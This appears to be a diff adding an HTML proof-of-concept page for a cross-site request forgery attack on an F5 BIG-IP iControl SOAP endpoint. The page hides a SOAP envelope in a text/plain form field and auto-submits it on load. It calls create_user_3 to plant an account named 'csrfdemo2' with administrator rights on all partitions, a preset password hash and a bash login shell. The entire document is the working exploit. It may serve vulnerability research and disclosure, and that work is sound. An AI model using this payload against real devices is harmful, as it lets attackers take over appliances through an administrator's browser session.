@@ -1,0 +1,41 @@
+
+      <form id="form" method="post" action="https://10.0.0.162/iControl/iControlPortal.cgi" enctype="text/plain">
+        <textarea id="payload" name="&lt;!--">--&gt;&lt;soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:user="urn:iControl:Management/UserManagement" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"&gt;
+&lt;soapenv:Header/&gt;
+&lt;soapenv:Body&gt;
+&lt;user:create_user_3 soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;
+&lt;users xsi:type="urn:Management.UserManagement.UserInfo3Sequence" soapenc:arrayType="urn:Management.UserManagement.UserInfo3[]" xmlns:urn="urn:iControl"&gt;
+
+&lt;item&gt;
+  &lt;user&gt;
+    &lt;name&gt;csrfdemo2&lt;/name&gt;
+    &lt;full_name&gt;CSRF Demo&lt;/full_name&gt;
+  &lt;/user&gt;
+
+  &lt;password&gt;
+    &lt;is_encrypted&gt;true&lt;/is_encrypted&gt;
+    &lt;password&gt;$6$T2mT4PeYSuyg/hSr$y/rN9tol5t1fRxTBqFVtxLzRfUBXt16yNahqYTaVVZa3PITfoAKBnuzqvwBT77qNBV4JjgwdhzqmsMk78bo6d0&lt;/password&gt;
+  &lt;/password&gt;
+
+  &lt;permissions&gt;
+    &lt;item&gt;
+      &lt;role&gt;USER_ROLE_ADMINISTRATOR&lt;/role&gt;
+      &lt;partition&gt;[All]&lt;/partition&gt;
+    &lt;/item&gt;
+  &lt;/permissions&gt;
+
+  &lt;login_shell&gt;/bin/bash&lt;/login_shell&gt;
+&lt;/item&gt;
+&lt;/users&gt;
+&lt;/user:create_user_3&gt;
+&lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+</textarea>
+        <input type=submit>
+      </form>
+
+      <script>
+        setTimeout(function() {
+          document.getElementById("form").submit();
+        }, 1000);
+      </script>
